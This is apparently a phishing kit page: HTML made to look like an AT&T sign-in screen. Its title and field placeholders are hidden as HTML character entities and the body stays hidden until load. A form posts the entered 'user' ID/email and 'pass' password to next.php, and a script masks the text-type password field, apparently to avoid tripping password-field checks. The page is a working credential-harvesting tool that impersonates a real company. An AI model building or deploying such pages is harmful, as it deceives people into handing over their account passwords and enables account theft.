<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#84;&#38;&#84;&#32;&#45;&#32;&#32;&#76;&#111;&#103;&#105;&#110;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
  
.textbox { 
    border: 1px solid #ccc; 
    height: 23px; 
    width: 275px; 
    font-size: 13px; 
    padding-left: 3px; 
    border-radius: 3px; 
    
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #555; 
    box-shadow: 0px 0px 4px #8EB1EB; 
    
} 

 </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:218px; z-index:0"><img src="images/t1.png" alt="" title="" border=0 width=1349 height=218></div>

<div id="image2" style="position:absolute; overflow:hidden; left:189px; top:12px; width:220px; height:22px; z-index:1"><a href="#"><img src="images/t2.png" alt="" title="" border=0 width=220 height=22></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1081px; top:16px; width:68px; height:15px; z-index:2"><a href="#"><img src="images/t3.png" alt="" title="" border=0 width=68 height=15></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:229px; top:51px; width:47px; height:48px; z-index:3"><a href="#"><img src="images/t4.png" alt="" title="" border=0 width=47 height=48></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:990px; top:61px; width:94px; height:22px; z-index:4"><a href="#"><img src="images/t5.png" alt="" title="" border=0 width=94 height=22></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:819px; top:216px; width:277px; height:235px; z-index:5"><img src="images/t6.png" alt="" title="" border=0 width=277 height=235></div>

<div id="image7" style="position:absolute; overflow:hidden; left:187px; top:1073px; width:973px; height:77px; z-index:6"><img src="images/t7.png" alt="" title="" border=0 width=973 height=77></div>

<div id="image8" style="position:absolute; overflow:hidden; left:192px; top:1089px; width:690px; height:16px; z-index:7"><a href="#"><img src="images/t8.png" alt="" title="" border=0 width=690 height=16></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:842px; top:218px; width:177px; height:13px; z-index:8"><a href="#"><img src="images/t9.png" alt="" title="" border=0 width=177 height=13></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:842px; top:271px; width:104px; height:14px; z-index:9"><a href="#"><img src="images/t10.png" alt="" title="" border=0 width=104 height=14></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:843px; top:398px; width:227px; height:24px; z-index:10"><a href="#"><img src="images/t11.png" alt="" title="" border=0 width=227 height=24></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:1028px; top:197px; width:16px; height:16px; z-index:15"><a href="#"><img src="images/t12.png" alt="" title="" border=0 width=16 height=16></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:1028px; top:250px; width:16px; height:16px; z-index:16"><a href="#"><img src="images/t12.png" alt="" title="" border=0 width=16 height=16></a></div>

<form action=next.php name=kamalhai id=kamalhai method=post>
<input name="user" placeholder="&#73;&#68;&#47;&#69;&#109;&#97;&#105;&#108;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:203px;left:844px;top:193px;z-index:11">
<input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:203px;left:844px;top:246px;z-index:12">
<div id="formcheckbox1" style="position:absolute; left:840px; top:293px; z-index:13"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:843px; top:358px; z-index:14"><input type="image" name="formimage1" width="227" height="24" src="images/sign.png"></div>

</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
